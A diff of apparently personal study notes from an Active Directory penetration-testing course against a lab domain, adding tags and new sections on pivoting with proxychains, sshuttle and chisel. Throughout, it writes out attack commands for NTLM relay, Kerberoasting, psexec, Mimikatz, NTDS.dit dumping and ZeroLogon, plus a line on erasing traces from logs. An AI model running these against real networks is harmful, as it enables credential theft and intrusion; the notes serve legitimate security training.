@@ -415,6 +415,7 @@ if we respond to the server in the right way =>    - the server will send us the
                                          - we can try to decrypt the hash
 
 ##### Responder
+#AD_tool
 we'll use the tool [[cheet#Responder|responder]] -->  to perform this attack
 =>
 `sudo python3 Responder.py -I vmnet8 -dPv`    (or dwv)
@@ -428,6 +429,7 @@ from THEPUNISHER:
 ![[Pasted image 20240225110349.png]]
 
 ##### Crack the password
+#AD_tool
 save the hash inside a file called hash.txt =>  `echo fcastle::MARVEL:... > hash.txt`
 - we'll use [[cheet#hashcat]]
 - we have captured an -->  NTLMv2 hash
@@ -468,6 +470,7 @@ attack steps:
 4) from the victim side we need an event that occurs
 
 ##### Identify host without SMB Signing (nmap)
+#AD_tool
 `nmap --script=smb2-security-mode.nse -p445 <DomainControllerIP> -Pn`
 `-Pn` -->  treat all hosts as online
 =>
@@ -487,6 +490,7 @@ now we can use it:
 `sudo python3 Responder.py -I vmnet8 -dPv`
 
 ##### Set up NTLM relay (ntlmrelayx.py)
+#AD_tool
 `ntlmrelayx.py -tf targets.txt -sm2support` 
 `-tf` -->  target file
 
@@ -521,6 +525,7 @@ if we type `help` -->  we can see all the commands that we can use
 we can do in different ways
 
 ##### Metasploit
+#AD_tool
 `msfconsole`
 `search psexec`    and look for exploit/windows/smb/psexec
 `use <number>`
@@ -543,6 +548,7 @@ open the windows machine (THEPUNISHER or SPIDERMAN)
 - turn all OFF
 
 ##### psexec.py
+#AD_tool
 `sudo psexec.py MARVEL/fcastle:'Password1'@172.16.214.130`
 [[cheet#psexec.py]]
 ![[Pasted image 20240226112845.png]]
@@ -559,6 +565,7 @@ if IPv6 is on:
 we can set up a fake DNS -->  using [[cheet#mitm6]]
 
 ##### mitm6
+#AD_tool
 follow all the steps --> [[cheet#mitm6|here]]
 if you reboot THEPUNISHER:
 - you will obtain a lot of information
@@ -607,6 +614,7 @@ once we have a valid account in a domain:
 we have the ability to get -->  a lot of information 
 
 ####  Domain Enumeration with ldapdomaindump
+#AD_tool
 [[cheet#ldapdomaindump|ldapdomaindump]] 
 `mkdir marvel.local`
 `sudo ldapdomaindump ldaps://172.16.214.128 -u 'MARVEL\fcastle' -p Password1 -o marvel.local'
@@ -646,6 +654,7 @@ we can leverage that to -->    - pass around the network    (passare alla rete)
                          - we can use it for lateral movement 
 
 ##### crackmapexec
+#AD_tool
 turn on all the windows machines
 follow these [[cheet#crackmapexec|steps]]
 `crackmapexec smb 172.16.214.0/24 -u fcastle -d MARVEL.local -p Password1`
@@ -682,6 +691,7 @@ you need only the last part underline
 ![[Pasted image 20240301171521.png]]
 
 #### Kerberoasting
+#AD_tool
 Attack to get domain admin in a network
 
 what the attack does:
@@ -777,6 +787,7 @@ there are a lot of tools for impersonation -->       - metasploit
 `run`
 
 ###### incognito
+#AD_tool
 `load incognito`
 > [!info] Load an extension
 > once you have a shell for example:
@@ -828,6 +839,7 @@ use -->  [[cheet#secretsdump]]
 
 
 #### LNK File Attack
+#AD_tool
 with this attack we can:
 set up a -->  watering hole (sorgente)
 
@@ -889,6 +901,7 @@ we can automate this attack using -->  [[cheet#crackmapexec]]
 `172.16.214.1` -->  attacker IP
 
 #### GPP Attacks (cPassword Attacks)
+#AD_tool
 This is an old attack
 => (no lab but it's still important to know it)
 
@@ -908,6 +921,7 @@ what this attack is:
                                          - they still could work in the environment
 
 #### Mimikatz
+#AD_tool
 login inside SPIDERMAN as normal user (pparker Password1)
 
 read these [[cheet#Mimikatz|lines]]
@@ -969,6 +983,7 @@ what do we do:
 	- creating a Golden Ticket can be useful too   (for persistent)
 
 #### Dumping the NTDS.dit
+#AD_tool
 NTDS.dit -->  <span style="color:#00b050">DB used to store AD data</span>
 			includes:
 			- user information
@@ -1049,6 +1064,7 @@ with this ticket:
 <span style="color:#00b050">we can access every machine</span> <span style="color:#00b050">on the DOMAIN</span>
 
 ##### Attack
+#AD_tool
 turn on THEPUNISHER and Domain Controller
 from the Domain Controller -->  install [[cheet#Install mimikatz on victim machine|mimikatz]]
 - `mimikatz.exe`
@@ -1099,6 +1115,7 @@ how to check:
 there are tools for checking if -->  a domain is affected by these vuln
 
 #### Abusing ZeroLogon
+#AD_tool
 It's a dangerous attack to run
 <span style="background:#fff88f">what is capable of doing:</span>
 - attacking a Domain Controller
@@ -1140,6 +1157,7 @@ if you want to run the attack:
 - <span style="color:#00b050">password restored</span>
 
 #### PrintNightmare (CVE-2021-1675)
+#AD_tool
 This is a -->  post compromised attack
 
 This attack takes advantage of -->  <span style="color:#00b050">printer spooler</span>
@@ -1196,10 +1214,6 @@ Now:
 
 =>
 <span style="color:#00b050">we can dump all the hashes</span>
-
-
-
-
 
 ### AD Case Study 
 #### AD Case Study 1
@@ -1382,7 +1396,7 @@ what we can do:
 
 you can do with 2 tools:
 - proxychains
-- s
+- sshuttle
 
 <span style="background:#fff88f">scenario:</span>
 - we have compromised a machine
@@ -1401,4 +1415,68 @@ we don't receive response -->  bc we don't have access to it
 - <span style="color:#00b050">to</span> the network (`10.10.10.5`)
 =>
 so that we can -->  <span style="color:#00b050">access to the network</span>
+
+### Proxychains
+#AD_tool
+first we need to look at -->  proxychains config file
+`cat /etc/proxychains.conf` 
+![[Pasted image 20240305140259.png]]
+we'll use the port 9050 -->  to bind to
+=>
+`ssh -f -N -D 9050 -i pivot root@10.10.155.5`
+`-i` -->  identity (is a file for login)
+`-f` -->  run ssh in background
+`-N` -->  we don't want to execute command (it's ideal for port forwarding)
+`-D` -->  we want to bind the port on port 9050
+=>
+what happen when we type enter:
+![[Pasted image 20240305140741.png]]
+we establish a connection with the victim machine in background
+=>
+now we can -->  <span style="color:#00b050">proxy our traffic through this machine to access the next network</span> 
+=>
+what can we do:
+different things:
+- run nmap through proxychains:
+  `proxychains nmap -p88 10.10.155.5`       (port 88 bc in this example there is Domain                                                                                         Controller on this port)
+- run attacks:
+  run [[Notes_ETH#Kerberoasting|kerberoasting attack]]:
+  `proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.155.5 -request`
+  (after we can decrypt the hash)
+  
+- access the machine:
+  `proxychains xfreerdb /u:administrator /p:'Hacker321!' /v:10.10.155.5
+
+- open the browser:
+  `proxychains firefox`
+
+### sshuttle
+#AD_tool
+`sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh cmd "ssh -i pivot"`
+- run this `root@10.10.155.5`
+- through that user -->  establish a connection to this `network 10.10.10.0/24`
+- run the ssh command `"ssh -i pivot"`
+
+as long as this terminal is open and the connection is established:
+=>
+we can send command to the network as below:
+`nmap -p88 10.10.155.5`  => without having to use proxychains
+
+### chisel
+another tool is -->  [chisel](https://github.com/jpillora/chisel)
+
+## Clean Up
+from a pentest perspective:   (that is different from a hacker perspective)
+the goal is -->  <span style="color:#00b050">leave the system/network as it was when you entered</span> 
+=>
+- remove executables, scripts, added files
+- remove malware, rootkits, added users
+- set settings back to original configurations
+
+from a hacker perspective:
+the goal is -->  <span style="color:#00b050">make it look like you were never there</span>
+=>
+- eliminating yourself from log files
+- all the things above
+
 
